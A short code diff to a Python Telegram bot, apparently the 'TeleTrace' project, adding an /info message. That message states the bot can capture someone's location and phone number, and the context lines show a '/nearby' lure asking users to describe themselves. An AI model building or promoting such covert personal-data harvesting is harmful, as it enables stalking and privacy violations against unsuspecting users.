@@ -51,6 +51,15 @@ To get started, type /nearby''')
 @bot.message_handler(commands=['admin'])
 def start(message):
 	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
+
+@bot.message_handler(commands=['info'])
+def start(message):
+    bot.send_message(message.chat.id, '''Hello! I am a developer of this Telegram bot, but I am not an admin of this bot. I have created this bot and uploaded the codes to GitHub for open source.
+
+This Telegram bot, one can capture someone's location and phone number. If you want to create your own bot, you can find more details by clicking on this link: https://github.com/OnlineHacKing/TeleTrace/
+
+Author of the script: @suman333mondal''')
+
 @bot.message_handler(commands=['nearby'])
 def start(message):
 	msg = bot.send_message(message.chat.id, 'First, write a little about yourself (in one message)') 
